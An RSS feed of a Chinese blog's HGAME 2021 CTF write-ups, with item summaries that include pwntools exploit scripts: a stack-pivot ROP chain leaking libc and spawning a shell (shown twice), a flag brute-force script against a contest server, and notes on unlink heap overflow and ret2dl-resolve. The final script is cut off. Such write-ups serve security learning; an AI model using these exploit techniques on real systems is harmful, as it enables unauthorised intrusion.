<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Hctf-Game on blog of chuj</title><link>https://chujdk.github.io/tags/hctf-game.html</link><description>Recent content in Hctf-Game on blog of chuj</description><generator>Hugo</generator><language>zh-cn</language><managingEditor>chujj31@gmail.com (chuj)</managingEditor><webMaster>chujj31@gmail.com (chuj)</webMaster><copyright>© chuj</copyright><lastBuildDate>Sat, 13 Mar 2021 23:01:00 +0000</lastBuildDate><atom:link href="https://chujdk.github.io/tags/hctf-game/index.xml" rel="self" type="application/rss+xml"/><item><title>HgameFINAL-nohook-WP</title><link>https://chujdk.github.io/wp/1183.html</link><pubDate>Sat, 13 Mar 2021 23:01:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1183.html</guid><description>&lt;p>Final 就做出这一道，第二道 webpwn 确实不太会，花了很长时间才搞出环境，最后无时间了。语神和我说出这个题也没想让我们做出来，感到一丝恶意和一丝释然。Hgame 到这里也正式结束了，总结就不写了。&lt;/p></description></item><item><title>HGAME2021-WEEK4-PWN-WP</title><link>https://chujdk.github.io/wp/1108.html</link><pubDate>Sun, 28 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1108.html</guid><description>&lt;p>hgame 也差不多结束了，第四周只做了 pwn，别的方向都不太会。pwn 的题还是比较简单的。&lt;/p>
&lt;h3 id="house_of_cosmos">house_of_cosmos&lt;/h3>
&lt;p>漏洞点看了很久才看出来&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/02/1322405410.png
">&lt;/div>
&lt;p>读入函数这里的 &lt;code>i&lt;/code> 是 &lt;code>unsigned int&lt;/code>，所以当 &lt;code>a2 &amp;lt;= 0&lt;/code> 时，就可以输入几乎无限的字符，轻松实现堆溢出。由于没有提供 &lt;code>show&lt;/code> 的功能，像前两周那样通过 &lt;code>Unsorted Bin&lt;/code> 来 leak 的方法就比较难了。但是既然可以堆溢出，又有指向堆块的指针，我们就可以朴素地用 &lt;code>unlink&lt;/code> 来实现利用。&lt;/p></description></item><item><title>HGAME-WEEK3-WP</title><link>https://chujdk.github.io/wp/1100.html</link><pubDate>Sun, 21 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1100.html</guid><description>&lt;h2 id="pwn">pwn&lt;/h2>
&lt;h3 id="blackgive">blackgive&lt;/h3>
&lt;p>栈迁移，不要想复杂了&lt;/p>
&lt;h4 id="exp">exp&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic"># coding=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">from&lt;/span> &lt;span style="color:#0e84b5;font-weight:bold">pwn&lt;/span> &lt;span style="color:#007020;font-weight:bold">import&lt;/span> &lt;span style="color:#666">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context(log_level &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;debug&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#666">.&lt;/span>terminal &lt;span style="color:#666">=&lt;/span> [&lt;span style="color:#4070a0">&amp;#39;tmux&amp;#39;&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;splitw&amp;#39;&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;-h&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh &lt;span style="color:#666">=&lt;/span> process(&lt;span style="color:#4070a0">&amp;#34;./blackgive&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#sh = remote(&amp;#34;&amp;#34;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc &lt;span style="color:#666">=&lt;/span> ELF(&lt;span style="color:#4070a0">&amp;#34;./libc6_2.27-3ubuntu1.4_amd64.so&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>elf &lt;span style="color:#666">=&lt;/span> ELF(&lt;span style="color:#4070a0">&amp;#34;./blackgive&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0x400813&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_base &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0x6010A0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>off &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0xA0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;paSsw0rd&amp;#39;&lt;/span>&lt;span style="color:#666">.&lt;/span>ljust(&lt;span style="color:#40a070">0x20&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">+=&lt;/span> p64(bss_base &lt;span style="color:#666">+&lt;/span> off &lt;span style="color:#666">-&lt;/span> &lt;span style="color:#40a070">0x8&lt;/span>) &lt;span style="color:#666">+&lt;/span> p64(&lt;span style="color:#40a070">0x4007A3&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;password:&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#gdb.attach(proc.pidof(sh)[0])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>send(payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span> &lt;span style="color:#666">*&lt;/span> off &lt;span style="color:#666">+&lt;/span> p64(pop_rdi_ret) &lt;span style="color:#666">+&lt;/span> p64(elf&lt;span style="color:#666">.&lt;/span>got[&lt;span style="color:#4070a0">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#666">+&lt;/span> p64(elf&lt;span style="color:#666">.&lt;/span>sym[&lt;span style="color:#4070a0">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#666">+&lt;/span> p64(&lt;span style="color:#40a070">0x40070a&lt;/span>) 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#34;!&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_addr &lt;span style="color:#666">=&lt;/span> u64(sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>,drop &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#007020;font-weight:bold">True&lt;/span>)&lt;span style="color:#666">.&lt;/span>ljust(&lt;span style="color:#40a070">8&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc_base &lt;span style="color:#666">=&lt;/span> puts_addr &lt;span style="color:#666">-&lt;/span> libc&lt;span style="color:#666">.&lt;/span>sym[&lt;span style="color:#4070a0">&amp;#39;puts&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;paSsw0rd&amp;#39;&lt;/span>&lt;span style="color:#666">.&lt;/span>ljust(&lt;span style="color:#40a070">0x20&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">+=&lt;/span> p64(&lt;span style="color:#40a070">0&lt;/span>) &lt;span style="color:#666">+&lt;/span> p64(libc_base &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#40a070">0x4f432&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>sendafter(&lt;span style="color:#4070a0">&amp;#34;password:&amp;#34;&lt;/span>,payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>interactive()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="without_leak">without_leak&lt;/h3>
&lt;p>64 位 &lt;code>ret2dl-resolve&lt;/code> 裸题。由于输出流都被关闭，所以无法实现 leak，考虑进行 &lt;code>ret2dl-resolve&lt;/code>。由于提供了 &lt;code>libc&lt;/code>，考虑通过伪造 &lt;code>link_map&lt;/code> 结构体 getshell。打本地的时候，即便打通了也会有&lt;/p></description></item><item><title>HGAME2021-WEEK3-PWN-WP</title><link>https://chujdk.github.io/wp/1090.html</link><pubDate>Tue, 16 Feb 2021 16:08:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1090.html</guid><description>&lt;h3 id="blackgive">blackgive&lt;/h3>
&lt;p>栈迁移&lt;/p>
&lt;h4 id="exp">exp&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic"># coding=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">from&lt;/span> &lt;span style="color:#0e84b5;font-weight:bold">pwn&lt;/span> &lt;span style="color:#007020;font-weight:bold">import&lt;/span> &lt;span style="color:#666">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context(log_level &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;debug&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#666">.&lt;/span>terminal &lt;span style="color:#666">=&lt;/span> [&lt;span style="color:#4070a0">&amp;#39;tmux&amp;#39;&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;splitw&amp;#39;&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;-h&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh &lt;span style="color:#666">=&lt;/span> process(&lt;span style="color:#4070a0">&amp;#34;./blackgive&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#sh = remote(&amp;#34;&amp;#34;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc &lt;span style="color:#666">=&lt;/span> ELF(&lt;span style="color:#4070a0">&amp;#34;./libc6_2.27-3ubuntu1.4_amd64.so&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>elf &lt;span style="color:#666">=&lt;/span> ELF(&lt;span style="color:#4070a0">&amp;#34;./blackgive&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0x400813&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_base &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0x6010A0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>off &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0xA0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;paSsw0rd&amp;#39;&lt;/span>&lt;span style="color:#666">.&lt;/span>ljust(&lt;span style="color:#40a070">0x20&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">+=&lt;/span> p64(bss_base &lt;span style="color:#666">+&lt;/span> off &lt;span style="color:#666">-&lt;/span> &lt;span style="color:#40a070">0x8&lt;/span>) &lt;span style="color:#666">+&lt;/span> p64(&lt;span style="color:#40a070">0x4007A3&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;password:&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#gdb.attach(proc.pidof(sh)[0])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>send(payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span> &lt;span style="color:#666">*&lt;/span> off &lt;span style="color:#666">+&lt;/span> p64(pop_rdi_ret) &lt;span style="color:#666">+&lt;/span> p64(elf&lt;span style="color:#666">.&lt;/span>got[&lt;span style="color:#4070a0">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#666">+&lt;/span> p64(elf&lt;span style="color:#666">.&lt;/span>sym[&lt;span style="color:#4070a0">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#666">+&lt;/span> p64(&lt;span style="color:#40a070">0x40070a&lt;/span>) 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#34;!&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_addr &lt;span style="color:#666">=&lt;/span> u64(sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>,drop &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#007020;font-weight:bold">True&lt;/span>)&lt;span style="color:#666">.&lt;/span>ljust(&lt;span style="color:#40a070">8&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc_base &lt;span style="color:#666">=&lt;/span> puts_addr &lt;span style="color:#666">-&lt;/span> libc&lt;span style="color:#666">.&lt;/span>sym[&lt;span style="color:#4070a0">&amp;#39;puts&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;paSsw0rd&amp;#39;&lt;/span>&lt;span style="color:#666">.&lt;/span>ljust(&lt;span style="color:#40a070">0x20&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">+=&lt;/span> p64(&lt;span style="color:#40a070">0&lt;/span>) &lt;span style="color:#666">+&lt;/span> p64(libc_base &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#40a070">0x4f432&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>sendafter(&lt;span style="color:#4070a0">&amp;#34;password:&amp;#34;&lt;/span>,payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>interactive()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="without_leak">without_leak&lt;/h3>
&lt;p>64 位 &lt;code>ret2dl-resolve&lt;/code> 裸题。由于输出流都被关闭，所以无法实现 leak，考虑进行 &lt;code>ret2dl-resolve&lt;/code>。由于提供了 &lt;code>libc&lt;/code>，考虑通过伪造 &lt;code>link_map&lt;/code> 结构体 getshell。打本地的时候，即便打通了也会有&lt;/p></description></item><item><title>HGAME-WEEK2-WP</title><link>https://chujdk.github.io/wp/1078.html</link><pubDate>Sun, 14 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1078.html</guid><description>&lt;h2 id="re">RE&lt;/h2>
&lt;h3 id="fake_debugger-beta">fake_debugger beta&lt;/h3>
&lt;p>没搞懂，不同位置的不同字符对应的编码都不同，没什么思路，写了个脚本爆破了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic"># coding=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">from&lt;/span> &lt;span style="color:#0e84b5;font-weight:bold">pwn&lt;/span> &lt;span style="color:#007020;font-weight:bold">import&lt;/span> &lt;span style="color:#666">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#context(log_level = &amp;#39;debug&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>total_char &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_=+|/?.&amp;gt;,&amp;lt;:;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\&amp;#34;\&amp;#39;\\&lt;/span>&lt;span style="color:#4070a0">`~!@#$%^&amp;amp;*()&lt;/span>&lt;span style="color:#70a0d0">{}&lt;/span>&lt;span style="color:#4070a0">[]&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">def&lt;/span> &lt;span style="color:#06287e">test&lt;/span>(flag_now):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh &lt;span style="color:#666">=&lt;/span> remote(&lt;span style="color:#4070a0">&amp;#34;101.132.177.131&amp;#34;&lt;/span>,&lt;span style="color:#40a070">9999&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#666">=&lt;/span> flag_now
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#34;now!&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">for&lt;/span> i &lt;span style="color:#007020;font-weight:bold">in&lt;/span> &lt;span style="color:#007020">range&lt;/span>(&lt;span style="color:#40a070">2&lt;/span> &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#007020">len&lt;/span>(flag_now)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#34;---&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,&lt;span style="color:#4070a0">&amp;#39; &amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#39;eax: &amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> code &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#007020">int&lt;/span>(sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh&lt;span style="color:#666">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">return&lt;/span> code
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">def&lt;/span> &lt;span style="color:#06287e">get_next&lt;/span>(flag_now):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh &lt;span style="color:#666">=&lt;/span> remote(&lt;span style="color:#4070a0">&amp;#34;101.132.177.131&amp;#34;&lt;/span>,&lt;span style="color:#40a070">9999&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#666">=&lt;/span> flag_now &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#4070a0">&amp;#39;a&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#34;now!&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">for&lt;/span> i &lt;span style="color:#007020;font-weight:bold">in&lt;/span> &lt;span style="color:#007020">range&lt;/span>(&lt;span style="color:#40a070">2&lt;/span> &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#007020">len&lt;/span>(flag_now) &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#40a070">2&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#34;---&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,&lt;span style="color:#4070a0">&amp;#39; &amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#39;ebx: &amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> code &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#007020">int&lt;/span>(sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">return&lt;/span> code
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;hgame{You_Kn0w_debuG&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">while&lt;/span>(flag[&lt;span style="color:#666">-&lt;/span>&lt;span style="color:#40a070">1&lt;/span>] &lt;span style="color:#666">!=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;}&amp;#39;&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mapping &lt;span style="color:#666">=&lt;/span> {}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">for&lt;/span> charac &lt;span style="color:#007020;font-weight:bold">in&lt;/span> total_char:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mapping[test(flag &lt;span style="color:#666">+&lt;/span> charac)] &lt;span style="color:#666">=&lt;/span> charac
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#60a0b0;font-style:italic">#print(str(test(charac)) + &amp;#39;:&amp;#39; + charac + &amp;#39;=&amp;gt;&amp;#39; + mapping[test(charac)])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> flag &lt;span style="color:#666">+=&lt;/span> mapping[get_next(flag)]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020">print&lt;/span> flag
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020">print&lt;/span> flag
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>分了几次爆破，所以这个脚本的起点就几乎是 &lt;code>flag&lt;/code> 了&lt;/p></description></item><item><title>HGAME2021-WEEK2-PWN-WP</title><link>https://chujdk.github.io/wp/1079.html</link><pubDate>Tue, 09 Feb 2021 19:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1079.html</guid><description>&lt;h3 id="rop_primary">rop_primary&lt;/h3>
&lt;p>没什么难度，就是单纯的 ROP&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic"># coding=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">from&lt;/span> &lt;span style="color:#0e84b5;font-weight:bold">pwn&lt;/span> &lt;span style="color:#007020;font-weight:bold">import&lt;/span> &lt;span style="color:#666">*&lt;/span>
